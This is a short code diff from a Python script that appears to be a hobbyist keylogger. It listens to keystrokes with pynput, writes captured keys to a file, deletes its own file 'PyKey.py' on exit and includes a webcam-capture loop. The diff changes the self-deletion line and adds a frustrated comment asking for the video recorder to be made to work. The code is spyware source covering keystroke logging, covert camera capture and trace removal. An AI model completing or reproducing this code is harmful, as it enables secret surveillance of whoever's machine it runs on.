@@ -64,13 +64,13 @@ def write_file(keys):
 def on_release(key):
     if key == Key.esc:
         return False
-        texit.register(lambda file = __file__: os.remove("PyKey.py"))#deleting file that didnt work? wat
+        os.remove("PyKey.py")#deleting file that didnt work? wat
 
 #calling all functions
 with Listener(on_press=on_press, on_release=on_release)as listener:
     listener.join()
 
-#video recorder
+#video recorder DOESNT WORK MAKE IT WORK FFS WHATS WRONG WITH YOU AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 vid=cv2.VideoCapture(0)
 while True:
     ret, frame = vid.read()
